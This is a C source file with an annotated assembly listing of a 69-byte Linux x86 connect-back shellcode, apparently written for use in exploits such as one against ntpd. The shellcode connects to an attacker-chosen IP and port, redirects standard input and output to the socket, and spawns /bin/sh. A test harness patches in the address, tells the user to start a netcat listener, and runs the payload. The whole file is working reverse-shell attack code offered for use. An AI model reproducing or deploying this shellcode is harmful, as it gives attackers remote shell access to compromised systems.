/*
	Minimalistic "69" remote shellcode - 69 bytes (connect-back)
	(with nulls :), for applications such as ntpd exploit
	by sd@sf.cz, if you can make it _shorter_ than 69 bytes, please
	send me changes.

# socket(AF_INET, SOCKET_STREAM, IPPROTO_TCP)
	push   $0x66		# socketcall()
	pop    %eax		# to eax
	xor    %ebx, %ebx	# socket() subcall == 1 (see inc %ebx below)
	push   %ebx		# IPPROTO_TCP (0)
	inc    %ebx		# ebx=1
	push   %ebx		# SOCKET_STREAM == 1
	push   $0x2		# AF_INET = 2
	mov    %esp, %ecx
	int    $0x80

# connect(fd, (sockaddr *), 16)
	push   $0x0100007f	# ip address
	push   $0x000a0002	# 0x_port_0002 (0002 - AF_INET)
	mov    %esp, %esi	# save this struct
	push   $0x10		# 16 bytes long
	push   %esi		# save ptr to sockaddr_in struc
	push   %eax		# file descriptor
	push   $0x66		# yah, there would be mov $0x66, %al (2 bytes)
	pop    %eax		# but fd < 256 not guaranted :(
	inc    %ebx             # 
	inc    %ebx		# ebx == 3, socket() subcall == 3
	mov    %esp, %ecx	# this crappy buffer stuff into ecx
	int    $0x80

# dup2(fd, 0-1-2)
	mov    %ebx, %ecx	# ebx == 3, we'll dup 3 too, but who cares :)
	pop    %ebx		# fd
1:
	mov    $0x3f, %al
	int    $0x80
	dec    %ecx		# next fd
	jns    1b
	
# execve("/bin/sh")
	.byte	0x68		# save "/bin/sh",0 to stack
	.string	"/sh"
	.byte	0x68
	.ascii	"/bin"
	mov    %esp,%ebx	# first ptr to binary
	push   %eax		# eax == 0
	push   %ebx		# ptr to our binary ptr
	mov    %esp,%ecx
	mov    $0xb,%al
	int    $0x80		# exec it! :)

/*
	sc[15] = ip address
	sc[22] = port
*/

#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>

unsigned char sc[69] =
	"\x6a\x66\x58\x31\xdb\x53\x43\x53"
	"\x6a\x02\x89\xe1\xcd\x80\x68\x7f" /* 7f... ip addr */
	"\x00\x00\x01\x68\x02\x00\x0a\x00" /* 0a00 = port (2560) */
	"\x89\xe6\x6a\x10\x56\x50\x6a\x66"
	"\x58\x43\x43\x89\xe1\xcd\x80\x89"
	"\xd9\x5b\xb0\x3f\xcd\x80\x49\x79"
	"\xf9\x68\x2f\x73\x68\x00\x68\x2f"
	"\x62\x69\x6e\x89\xe3\x50\x53\x89"
	"\xe1\xb0\x0b\xcd\x80";

int	main()
{
	unsigned	port;
	unsigned	ip[4];
	void		(*execme)() = (void *) sc;
	int		i;
	printf("Enter port to connect to:");
	while (scanf("%u", &port) != 1);
	printf("Enter ip address to connect to:");
	while (scanf("%u.%u.%u.%u", &ip[0], &ip[1], &ip[2], &ip[3]) != 4);
	printf("Setup a netcat: `nc -lvp %d` on  %u.%u.%u.%u\n"
	        "And press any enter...", port, ip[0], ip[1], ip[2], ip[3]);
	getchar();
	/* copy an IP address */
	for (i=0; i < 4; i++)
		sc[15+i] = ip[i];
	/* setup the port */
	* ((unsigned short *) &sc[22]) = htons(port);
	printf("Executing shellcode...\n");
	execme();
	return 0;
}
